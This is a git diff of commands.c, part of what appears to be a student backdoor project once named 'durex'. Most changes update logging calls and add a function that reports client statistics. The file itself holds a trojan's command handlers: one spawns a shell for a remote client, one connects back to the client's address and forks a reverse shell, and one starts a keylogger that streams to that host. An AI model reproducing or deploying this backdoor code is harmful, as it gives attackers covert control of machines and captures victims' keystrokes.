@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   commands.c                                         :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
+/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
-/*   Updated: 2018/08/30 03:55:17 by root             ###   ########.fr       */
+/*   Updated: 2019/05/12 17:55:33 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,12 +25,14 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+/* snprintf */
+#include <stdio.h>
 
-#include "durex.h"
+#include "main.h"
 
 void				serverHelp(t_cl *client, t_cmd *cmds)
 {
-	serverLog("[CMDS] - %d: Help wanted.", client->fd);
+	serverLog(1, "[CMDS] - %d: Help wanted.\n", client->fd);
 	for (size_t i = 0; cmds[i].name; i++) {
 		clientWrite(cmds[i].name, client);
 		if (cmds[i].options != NULL) {
@@ -47,7 +49,7 @@ void				serverHelp(t_cl *client, t_cmd *cmds)
 void				serverShell(t_cl *client, t_cmd *cmds)
 {
 	(void)cmds;
-	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
+	serverLog(1, "[CMDS] - %d: Shell wanted.\n", client->fd);
 	client->shell = spawnShell(client->fd);
 	if (client->shell == -1)
 		clientWrite("Failed to spawn a shell...\n", client);
@@ -69,7 +71,7 @@ static int			serverConnectShell(t_cl *client, char *port)
 	hints.ai_addr = NULL;
 	hints.ai_next = NULL;
 	if ((fd = getaddrinfo(client->addr, port, &hints, &res))) {
-		serverLog("[ERRO] - %d: %s", client->fd, gai_strerror(fd));
+		serverLog(1, "[ERRO] - %d: %s\n", client->fd, gai_strerror(fd));
 		clientWrite(gai_strerror(fd), client);
 		clientWrite("\n", client);
 		return -1;
@@ -88,7 +90,7 @@ static int			serverConnectShell(t_cl *client, char *port)
 	}
 	freeaddrinfo(res);
 	if (tmp == NULL || fd < 0) {
-		serverLog("[ERRO] - %d: Failed to connect to %s:%s (%s)",
+		serverLog(1, "[ERRO] - %d: Failed to connect to %s:%s (%s)\n",
 				  client->fd, client->addr, port,
 				  (tmp) ? strerror(errno) : "No server found");
 		clientWrite("Failed to connect to ", client);
@@ -100,7 +102,7 @@ static int			serverConnectShell(t_cl *client, char *port)
 		clientWrite(")\n", client);
 		return -1;
 	}
-	serverLog("[CMDS] - %d: Connection to %s:%s succeeded.", client->fd, client->addr, port);
+	serverLog(1, "[CMDS] - %d: Connection to %s:%s succeeded.\n", client->fd, client->addr, port);
 	clientWrite("Succesfully Connected\n", client);
 	return fd;
 }
@@ -112,7 +114,7 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	int				fd;
 	pid_t			pid;
 
-	serverLog("[CMDS] - %d: Reverse shell wanted.", client->fd);
+	serverLog(1, "[CMDS] - %d: Reverse shell wanted.\n", client->fd);
 	options = mysplitwhitespaces(cmds->opt);
 	port = (options && options[1]) ? options[1] : SERVER_REMOTE_PORT;
 	fd = serverConnectShell(client, port);
@@ -120,7 +122,7 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	if (fd >= 0) {
 		pid = fork();
 		if (pid == 0) {
-			serverLog("[CMDS] - %d: Spawning reverse shell on %s:%s", client->fd, client->addr, port);
+			serverLog(1, "[CMDS] - %d: Spawning reverse shell on %s:%s\n", client->fd, client->addr, port);
 			clientWrite("Spawning reverse shell...\n", client);
 			struct rlimit	rlim;
 
@@ -142,7 +144,7 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 		} else if (pid > 0) {
 			serverQuitClient(client, cmds);
 		} else {
-			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
+			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->fd);
 			clientWrite("Fork failed.\n", client);
 		}
 		close(fd);
@@ -158,7 +160,7 @@ void			serverKeylogger(t_cl *client, t_cmd *cmds)
 	int				fd;
 	pid_t			pid;
 
-	serverLog("[CMDS] - %d: Keylogger wanted.", client->fd);
+	serverLog(1, "[CMDS] - %d: Keylogger wanted.\n", client->fd);
 	options = mysplitwhitespaces(cmds->opt);
 	port = (options && options[1]) ? options[1] : SERVER_KEYLOG_PORT;
 	fd = serverConnectShell(client, port);
@@ -166,7 +168,7 @@ void			serverKeylogger(t_cl *client, t_cmd *cmds)
 	if (fd >= 0) {
 		pid = fork();
 		if (pid == 0) {
-			serverLog("[CMDS] - %d: Initialising Keylogger...", client->fd);
+			serverLog(1, "[CMDS] - %d: Initialising Keylogger...\n", client->fd);
 			struct rlimit	rlim;
 
 			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
@@ -179,7 +181,7 @@ void			serverKeylogger(t_cl *client, t_cmd *cmds)
 				close(fd);
 			exit(0);
 		} else if (pid < 0) {
-			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
+			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->fd);
 			clientWrite("Fork failed.\n", client);
 		}
 		close(fd);
@@ -194,7 +196,7 @@ void			serverPrintLogs(t_cl *client, t_cmd *cmds)
 	int			ret;
 
 	(void)cmds;	
-	serverLog("[CMDS] - %d: Logs wanted.", client->fd);
+	serverLog(1, "[CMDS] - %d: Logs wanted.\n", client->fd);
 	fd = open(SERVER_REPORTER, O_RDONLY);
 	if (fd < 0)
 		clientWrite("Failed to open logs...\n", client);
@@ -211,11 +213,44 @@ void			serverPrintLogs(t_cl *client, t_cmd *cmds)
 	clientWrite("$> ", client);
 }
 
+void			serverPrintStats(t_cl *client, t_cmd *cmds)
+{
+	char		buf[128];
+
+	(void)cmds;	
+	serverLog(1, "[CMDS] - %d: Statistics wanted.\n", client->fd);
+	clientWrite("Clients connected:\n", client);
+	for (size_t i = 0; i < SERVER_CLIENT_MAX; i++)
+	{
+		if (e.server.client[i].fd != -1)
+		{
+			snprintf(buf, sizeof(buf), "- %ld: Online\n", i + 1);
+			clientWrite(buf, client);
+			snprintf(buf, sizeof(buf), "\tAddress: %s\n", e.server.client[i].addr);
+			clientWrite(buf, client);
+			snprintf(buf, sizeof(buf), "\tHost   : %s\n", e.server.client[i].host);
+			clientWrite(buf, client);
+			snprintf(buf, sizeof(buf), "\tPort   : %s\n", e.server.client[i].port);
+			clientWrite(buf, client);
+			snprintf(buf, sizeof(buf), "\tShell  : %s\n", e.server.client[i].shell != -1 ? "Opened" : "Closed");
+			clientWrite(buf, client);
+			snprintf(buf, sizeof(buf), "\tLogged : %s\n", e.server.client[i].logged ? "Yes" : "No");
+			clientWrite(buf, client);
+		}
+		else
+		{
+			snprintf(buf, sizeof(buf), "- %ld: Offline\n", i + 1);
+			clientWrite(buf, client);
+		}
+	}
+	clientWrite("$> ", client);
+}
+
 void			serverQuitClient(t_cl *client, t_cmd *cmds)
 {
 	if (client->fd != -1) {
 		serverQuitClientShell(client, cmds);
-		serverLog("[CMDS] - %d: Client quit.", client->fd);
+		serverLog(1, "[CMDS] - %d: Client quit.\n", client->fd);
 		close(client->fd);
 		client->fd = -1;
 	}
@@ -225,7 +260,7 @@ void			serverQuitClientShell(t_cl *client, t_cmd *cmds)
 {
 	(void)cmds;
 	if (client->shell != -1) {
-		serverLog("[CMDS] - %d: Client shell killed.", client->fd);
+		serverLog(1, "[CMDS] - %d: Client shell killed.\n", client->fd);
 		close(client->shell);
 		client->shell = -1;
 	}
